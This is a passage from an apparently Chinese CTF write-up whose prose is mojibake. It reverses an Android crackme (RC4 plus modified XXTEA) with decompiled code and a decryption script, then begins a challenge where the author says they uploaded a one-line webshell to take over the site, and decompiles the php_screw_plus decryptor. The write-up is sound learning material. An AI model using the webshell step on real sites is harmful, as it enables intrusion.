v21 += (((v29 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v37)) + ((v37 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v29))) ^ ((v23 ^ v37) + (v29 ^ v42));</span><br><span class="line">      v23 -= <span class="number">1621657930</span>;</span><br><span class="line">      ++v43;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v43 );</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">1</span>) = v22;</span><br><span class="line">    *(_DWORD *)v38 = v37;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">2</span>) = v24;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">3</span>) = v27;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">4</span>) = v25;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">5</span>) = v31;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">7</span>) = v29;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">6</span>) = v33;</span><br><span class="line">    *((_DWORD *)v38 + <span class="number">8</span>) = v21;</span><br><span class="line">    LOBYTE(v5) = <span class="built_in">memcmp</span>(v38, &amp;unk_3440, <span class="number">0x24</span>u) == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å’Œä¹‹å‰çœ‹releaseæ¨¡å¼ç¼–è¯‘çš„800å¤šè¡Œc++ä»£ç æ¯”èµ·æ¥ï¼Œå…¶å®è¿˜å¥½ã€‚å¾ˆæ˜æ˜¾å¼€å§‹ä¸€ä¸ªrc4åŠ å¯†ï¼Œæ¥ç€ä¸€ä¸ªteaï¼Œä»”ç»†çœ‹ä¸‹ï¼Œå¯ä»¥çŸ¥é“æ˜¯xxteaã€‚</p><p>ç„¶åæœ‰å‡ ä¸ªå‡½æ•°ï¼Œçœ‹å¾—å‡ºæ¥æ˜¯åŠ å¯†å‡½æ•°ï¼Œä½†æ²¡æœ‰å¼•ç”¨å…³ç³»ã€‚ä½†è¿™æ ·çœ‹ï¼Œä¸å¥½çœ‹å‡ºè¿™ä¸ªxxteaæ˜¯å¦ç»è¿‡é­”æ”¹ã€‚</p><p>æ‰€ä»¥æˆ‘å†³å®šå»çœ‹ä¸‹armV7çš„soï¼Œç„¶åè°ƒè¯•ä¸€æ³¢ï¼Œæ„Ÿè§‰å‘ç°äº†æ–°å¤©åœ°ï¼Œï¼Œè¿™æ¸…æ™°çš„åŠ å¯†æµç¨‹ã€‚ã€‚ä»è¿™æ‰çŸ¥é“ä¸åŒç‰ˆæœ¬çš„soåç¼–è¯‘ç»“æœå¦‚æ­¤ä¹‹å¤§ï¼Œå…¶å®è¿™ä¸ªarmV7çš„soåº”è¯¥æ‰æ˜¯ä½œè€…è‡ªå·±å†™çš„ï¼Œä»¥åçœ‹soçš„æ—¶å€™åº”è¯¥é¦–å…ˆarmV7çš„soã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> __<span class="function">fastcall <span class="title">Java_come_crack_crackme2_MainActivity_chk</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v5[<span class="number">260</span>]; <span class="comment">// [sp+0h] [bp-118h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = (<span class="keyword">char</span> *)z(a1, a3);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v3) != <span class="number">36</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  z2(v5, (<span class="keyword">unsigned</span> __int8 *)d, <span class="number">0x10</span>u);</span><br><span class="line">  z3(v5, (<span class="keyword">unsigned</span> __int8 *)v3, <span class="number">0x24</span>u);</span><br><span class="line">  z4((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v3, <span class="number">9u</span>, d);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcmp</span>(v3, &amp;ss, <span class="number">0x24</span>u) == <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢z2ï¼Œz3å°±æ˜¯rc4çš„åˆå§‹åŒ–å’ŒåŠ å¯†ï¼Œçœ‹z4ï¼šç›¸å½“æ¸…æ™°çš„xxteaï¼Œç¡®å®šåªæ˜¯æ”¹äº†delatã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">z4</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// lr</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// r3</span></span><br><span class="line"></span><br><span class="line">  v3 = a2 - <span class="number">1</span>;</span><br><span class="line">  v6 = a1[a2 - <span class="number">1</span>];</span><br><span class="line">  v7 = sub_1258(<span class="number">52</span>) + <span class="number">6</span>;</span><br><span class="line">  result = <span class="number">-1621657930</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v7 &gt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 -= <span class="number">1621657930</span>;</span><br><span class="line">    --v7;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    v11 = (v9 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v3 != v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = ((((<span class="number">4</span> * a1[v10 + <span class="number">1</span>]) ^ (v6 &gt;&gt; <span class="number">5</span>)) + ((a1[v10 + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v6))) ^ ((a3[v10 &amp; <span class="number">3</span> ^ v11] ^ v6)</span><br><span class="line">                                                                                  + (a1[v10 + <span class="number">1</span>] ^ v9)))</span><br><span class="line">         + a1[v10];</span><br><span class="line">      a1[v10++] = v6;</span><br><span class="line">    &#125;</span><br><span class="line">    result = (((<span class="number">4</span> * *a1) ^ (v6 &gt;&gt; <span class="number">5</span>)) + ((*a1 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v6))) ^ ((*a1 ^ v9) + (a3[v3 &amp; <span class="number">3</span> ^ v11] ^ v6));</span><br><span class="line">    v6 = result + a1[v3];</span><br><span class="line">    a1[v3] = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰¾å¯†æ–‡ï¼Œç”¨ä¹‹å‰é€†xxteaå†™çš„è„šæœ¬è§£ä¸€ä¸‹ï¼Œç„¶åæ‰¾rc4å¼‚æˆ–åºåˆ—å¼‚æˆ–ä¸€ä¸‹å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> len = <span class="number">9</span>; <span class="comment">//é•¿åº¦æ˜¯è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦/4ï¼Œå› ä¸ºåŠ å¯†æ˜¯32ä½ä¸ºä¸€ä¸ªå•ä½</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> delat = <span class="number">0x60A8894A</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[] = &#123;<span class="number">0x1</span>, <span class="number">0x10</span>, <span class="number">0x100</span>, <span class="number">0x1000</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> enc[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">0x68E5973E</span>, <span class="number">0xC20C7367</span>, <span class="number">0x98AFD41B</span>, <span class="number">0xFE4B9DE2</span>, <span class="number">0x01A5B60B</span>,</span><br><span class="line"><span class="number">0x3D36D646</span>, <span class="number">0xDBCC7BAF</span>, <span class="number">0xA0414F00</span>, <span class="number">0x762CE71A</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">get_sum</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">unsigned</span> <span class="keyword">int</span> delat)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">52</span>/n+<span class="number">6</span>; i++)</span><br><span class="line">sum -= delat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">de_xxtea</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> sum = get_sum(len, delat);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> sum1 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(sum &gt;&gt; <span class="number">2</span>);</span><br><span class="line">        enc[len<span class="number">-1</span>] -= ((key[((len<span class="number">-1</span>)^sum1)&amp;<span class="number">3</span>]^enc[len<span class="number">-2</span>])+(enc[<span class="number">0</span>]^sum)) ^ (((<span class="number">4</span>*enc[<span class="number">0</span>])^(enc[len<span class="number">-2</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[len<span class="number">-2</span>])^(enc[<span class="number">0</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = len<span class="number">-2</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            enc[i] -= ((key[(i^sum1)&amp;<span class="number">3</span>]^enc[i<span class="number">-1</span>])+(enc[i+<span class="number">1</span>]^sum)) ^ (((<span class="number">4</span>*enc[i+<span class="number">1</span>])^(enc[i<span class="number">-1</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[i<span class="number">-1</span>])^(enc[i+<span class="number">1</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line">            i--; </span><br><span class="line">        &#125;<span class="keyword">while</span>(i != <span class="number">0</span>);</span><br><span class="line">        enc[<span class="number">0</span>] -= ((key[(<span class="number">0</span>^sum1)&amp;<span class="number">3</span>]^enc[len<span class="number">-1</span>])+(enc[<span class="number">1</span>]^sum)) ^ (((<span class="number">4</span>*enc[<span class="number">1</span>])^(enc[len<span class="number">-1</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[len<span class="number">-1</span>])^(enc[<span class="number">1</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line"></span><br><span class="line">        sum += delat;</span><br><span class="line">    &#125;<span class="keyword">while</span>(sum != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    de_xxtea();</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>*len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d, "</span>, ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)&amp;enc)[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//86, 4, 176, 212, 156, 99, 77, 48, 150, 206, 192, 5, 147, 190, 59, 130, 82, 75, 22, 178, 138, 51, 183, 77, 109, 123, 153, 80, 194, 177, 12, 18, 225, 132, 10, 147</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = [<span class="number">0x00</span>, <span class="number">0x59</span>, <span class="number">0xE3</span>, <span class="number">0x80</span>, <span class="number">0xD3</span>, <span class="number">0x67</span>, <span class="number">0x42</span>, <span class="number">0x33</span>, <span class="number">0x96</span>, <span class="number">0xC4</span>, <span class="number">0xC6</span>, <span class="number">0x0D</span>, <span class="number">0x94</span>, <span class="number">0xBD</span>, <span class="number">0x6E</span>, <span class="number">0xD2</span>, <span class="number">0x5D</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0xB3</span>, <span class="number">0x8E</span>, <span class="number">0x32</span>, <span class="number">0xE0</span>, <span class="number">0x46</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x9B</span>, <span class="number">0x54</span>, <span class="number">0xCE</span>, <span class="number">0xB0</span>, <span class="number">0x5F</span>, <span class="number">0x19</span>, <span class="number">0xE2</span>, <span class="number">0x81</span>, <span class="number">0x5E</span>, <span class="number">0xD8</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = <span class="string">"012345678901234567890123456789123456"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t</span><br><span class="line"><span class="string">'012345678901234567890123456789123456'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = [ord(t[i])^s[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans</span><br><span class="line">[<span class="number">48</span>, <span class="number">104</span>, <span class="number">209</span>, <span class="number">179</span>, <span class="number">231</span>, <span class="number">82</span>, <span class="number">116</span>, <span class="number">4</span>, <span class="number">174</span>, <span class="number">253</span>, <span class="number">246</span>, <span class="number">60</span>, <span class="number">166</span>, <span class="number">142</span>, <span class="number">90</span>, <span class="number">231</span>, <span class="number">107</span>, <span class="number">47</span>, <span class="number">112</span>, <span class="number">138</span>, <span class="number">190</span>, <span class="number">3</span>, <span class="number">210</span>, <span class="number">117</span>, <span class="number">12</span>, <span class="number">66</span>, <span class="number">173</span>, <span class="number">99</span>, <span class="number">246</span>, <span class="number">137</span>, <span class="number">110</span>, <span class="number">43</span>, <span class="number">209</span>, <span class="number">181</span>, <span class="number">107</span>, <span class="number">238</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = [<span class="number">86</span>, <span class="number">4</span>, <span class="number">176</span>, <span class="number">212</span>, <span class="number">156</span>, <span class="number">99</span>, <span class="number">77</span>, <span class="number">48</span>, <span class="number">150</span>, <span class="number">206</span>, <span class="number">192</span>, <span class="number">5</span>, <span class="number">147</span>, <span class="number">190</span>, <span class="number">59</span>, <span class="number">130</span>, <span class="number">82</span>, <span class="number">75</span>, <span class="number">22</span>, <span class="number">178</span>, <span class="number">138</span>, <span class="number">51</span>, <span class="number">183</span>, <span class="number">77</span>, <span class="number">109</span>, <span class="number">123</span>, <span class="number">153</span>, <span class="number">80</span>, <span class="number">194</span>, <span class="number">177</span>, <span class="number">12</span>, <span class="number">18</span>, <span class="number">225</span>, <span class="number">132</span>, <span class="number">10</span>, <span class="number">147</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = [ans[i]^e[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag</span><br><span class="line">[<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">49</span>, <span class="number">57</span>, <span class="number">52</span>, <span class="number">56</span>, <span class="number">51</span>, <span class="number">54</span>, <span class="number">57</span>, <span class="number">53</span>, <span class="number">48</span>, <span class="number">97</span>, <span class="number">101</span>, <span class="number">57</span>, <span class="number">100</span>, <span class="number">102</span>, <span class="number">56</span>, <span class="number">52</span>, <span class="number">48</span>, <span class="number">101</span>, <span class="number">56</span>, <span class="number">97</span>, <span class="number">57</span>, <span class="number">52</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">56</span>, <span class="number">98</span>, <span class="number">57</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">97</span>, <span class="number">125</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytes(flag)</span><br><span class="line"><span class="string">b'flag&#123;194836950ae9df840e8a94348b901a&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="so-get-source"><a href="#so-get-source" class="headerlink" title="so_get_source"></a>so_get_source</h3><p>è¿›å…¥ç½‘ç«™ï¼Œä¸Šä¼ ä¸€ä¸ªä¸€å¥åŒ–æœ¨é©¬æ‹¿åˆ°shellï¼Œç„¶åæŠŠç½‘ç«™æ‰“åŒ…ä¸‹æ¥ã€‚</p><p><img src="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20210801094123439.png" alt="image-20210801094123439"></p><p>å‘ç°flag.phpä¸index.phpéƒ½æ˜¯è¢«åŠ å¯†åçš„ï¼Œè€Œè¿™é‡Œæœ‰ä¸€ä¸ªå¯ç–‘çš„php_screw_plus.soæ–‡ä»¶ï¼Œè¿™å’Œé€†å‘å°±æ›´è´´è¿‘äº†ã€‚</p><p>æœç´¢ä¸€ä¸‹php_screw_plus.soï¼Œå‘ç°è¿™ä¸ªå°±æ˜¯å¯¹æˆ‘ä»¬çš„phpæ–‡ä»¶å®ç°åŠ è§£å¯†åŠŸèƒ½çš„æ–‡ä»¶ã€‚</p><p>åˆ°idaä¸­å»æ‰¾åˆ°<strong>pm9screw_ext_fopen</strong>å‡½æ•°ï¼šæ‰“å¼€å¾…åŠ å¯†æˆ–è€…è§£å¯†çš„æ–‡ä»¶ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">FILE *__<span class="function">fastcall <span class="title">pm9screw_ext_fopen</span><span class="params">(FILE *stream)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> __m128i *v1; <span class="comment">// rax</span></span><br><span class="line">  __m128i v2; <span class="comment">// xmm0</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  _OWORD *v6; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// er12</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// cl</span></span><br><span class="line">  FILE *v12; <span class="comment">// rax</span></span><br><span class="line">  FILE *v13; <span class="comment">// rbp</span></span><br><span class="line">  __m128i v15; <span class="comment">// [rsp+0h] [rbp-138h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+1Ch] [rbp-11Ch] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">stat_buf</span>;</span> <span class="comment">// [rsp+20h] [rbp-118h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [rsp+B0h] [rbp-88h] BYREF</span></span><br><span class="line">  __m128i v19; <span class="comment">// [rsp+C0h] [rbp-78h]</span></span><br><span class="line">  __m128i v20; <span class="comment">// [rsp+D0h] [rbp-68h] BYREF</span></span><br><span class="line">  __m128i v21; <span class="comment">// [rsp+E0h] [rbp-58h]</span></span><br><span class="line">  __int128 v22; <span class="comment">// [rsp+F0h] [rbp-48h]</span></span><br><span class="line">  __int128 v23; <span class="comment">// [rsp+100h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v24; <span class="comment">// [rsp+118h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v24 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v20 = <span class="number">0L</span>L;</span><br><span class="line">  v21 = <span class="number">0L</span>L;</span><br><span class="line">  v22 = <span class="number">0L</span>L;</span><br><span class="line">  v23 = <span class="number">0L</span>L;</span><br><span class="line">  v15 = <span class="number">0L</span>L;</span><br><span class="line">  v1 = (<span class="keyword">const</span> __m128i *)md5(<span class="string">"GH65Hws2jedf3fl3MeK"</span>);</span><br><span class="line">  v20 = _mm_loadu_si128(v1);</span><br><span class="line">  v19 = v20;</span><br><span class="line">  v2 = _mm_load_si128(&amp;v15);</span><br><span class="line">  v21 = _mm_loadu_si128(v1 + <span class="number">1</span>);</span><br><span class="line">  *(__m128i *)nptr = v2;</span><br><span class="line">  v3 = fileno(stream);</span><br><span class="line">  __fxstat(<span class="number">1</span>, v3, &amp;stat_buf);</span><br><span class="line">  v16 = stat_buf.st_size;</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">0x200000</span>uLL);</span><br><span class="line">  v5 = v16;</span><br><span class="line">  *v4 = <span class="number">0L</span>L;</span><br><span class="line">  v6 = v4;</span><br><span class="line">  __fread_chk(v4, <span class="number">0x200000</span>LL, v5, <span class="number">1L</span>L, stream);</span><br><span class="line">  v7 = teg_yek(stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="keyword">if</span> ( *(_OWORD *)&amp;v19 == *v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v16;</span><br><span class="line">    <span class="keyword">if</span> ( v16 &gt; <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="number">16L</span>L;</span><br><span class="line">      v10 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v16 - <span class="number">17</span>) + <span class="number">17L</span>L;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v11 = *((_BYTE *)v6 + v9);</span><br><span class="line">          <span class="keyword">if</span> ( v9 &gt; <span class="number">0x1F</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          *((_BYTE *)&amp;stat_buf.__unused[<span class="number">1</span>] + v9++) = v11;</span><br><span class="line">          <span class="keyword">if</span> ( v10 == v9 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">        &#125;</span><br><span class="line">        *((_BYTE *)v6 + v9++ - <span class="number">32</span>) = v11;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v10 != v9 );</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_7:</span><br><span class="line">    screw_aes(<span class="number">0L</span>L, v6, v8, &amp;v20, &amp;v16, v7, v15.m128i_i64[<span class="number">0</span>], v15.m128i_i64[<span class="number">1</span>]);</span><br><span class="line">    v16 = strtol(nptr, <span class="number">0L</span>L, <span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = tmpfile();</span><br><span class="line">  v13 = v12;</span><br><span class="line">  <span class="keyword">if</span> ( v16 &lt;= <span class="number">0</span> )</span><br><span class="line">    fwrite(<span class="string">"ACCESS DENIED"</span>, <span class="number">0xD</span>uLL, <span class="number">1u</span>LL, v12);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fwrite(v6, v16, <span class="number">1u</span>LL, v12);</span><br><span class="line">  <span class="built_in">free</span>(v6);</span><br><span class="line">  rewind(v13);</span><br><span class="line">  <span class="keyword">return</span> v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éƒ½æœ‰å‡½æ•°åçš„ï¼Œæ‰€ä»¥åˆ†æèµ·æ¥éš¾åº¦ä¸å¤§ï¼Œä¸»è¦å°±æ˜¯ä¸€ä¸ªaes_256_cbcåŠ 